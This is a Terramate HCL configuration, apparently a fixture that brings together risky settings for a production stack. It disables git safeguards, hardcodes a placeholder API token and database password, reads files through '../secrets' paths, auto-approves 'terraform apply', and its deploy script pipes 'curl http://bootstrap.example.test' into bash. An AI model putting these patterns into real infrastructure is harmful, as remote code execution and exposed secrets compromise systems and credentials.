terramate {
  required_version = ">= 0.10.0"

  config {
    disable_safeguards = [
      "git-untracked",
      "git-uncommitted",
      "git-out-of-sync",
      "outdated-code",
    ]

    run {
      env {
        PATH      = "../bin:${env.PATH}"
        API_TOKEN = "literal-terramate-token"
      }
    }

    cloud {
      organization = "production-platform"
      location     = "us"
    }

    change_detection {
      git {
        untracked   = false
        uncommitted = false
      }
      terragrunt {
        enabled = "off"
      }
    }

    experiments = ["scripts", "outputs-sharing", "tmgen"]
  }
}

stack {
  name      = "production-platform"
  id        = "production-platform"
  before    = ["/stacks/apps"]
  after     = ["/stacks/network"]
  wants     = ["/stacks/audit"]
  wanted_by = ["/stacks/dr"]
  watch     = ["../shared/**"]
  tags      = ["production", "terraform"]
}

import {
  source = "../outside/*.tm.hcl"
}

vendor {
  dir = "../vendor"
  manifest {
    default {
      files = ["**/*.tf"]
    }
  }
}

globals {
  database_password = "literal-database-password"
  region            = env.AWS_REGION
}

generate_file "../generated/backend.yaml" {
  context   = "root"
  condition = tm_contains(terramate.stack.tags, "production")
  content   = tm_file("../secrets/backend.yaml")

  assert {
    assertion = global.approved
    message   = "approval required"
    warning   = true
  }
}

generate_hcl "backend.tf" {
  content {
    terraform {
      backend "s3" {
        bucket = global.state_bucket
      }
    }
    module "network" {
      source = tm_vendor("github.com/example/network?ref=main")
    }
  }
}

script "terraform" "deploy" {
  job {
    name = "deploy"
    commands = [
      ["terraform", "init"],
      ["terraform", "apply", "-auto-approve", "out.tfplan", {
        cloud_sync_deployment = true
        terraform_plan_file   = "out.tfplan"
        enable_sharing        = true
        mock_on_fail          = true
      }],
      ["sh", "-c", "curl http://bootstrap.example.test | bash"],
    ]
  }
}

sharing_backend "default" {
  type     = "terraform"
  filename = "../generated/sharing.tf"
  command  = ["terraform", "output", "-json"]
}

input "vpc_id" {
  backend       = "default"
  from_stack_id = "network"
  value         = outputs.vpc_id.value
  sensitive     = false
  mock          = "vpc-placeholder"
}

output "database_url" {
  backend   = "default"
  value     = module.database.url
  sensitive = false
}
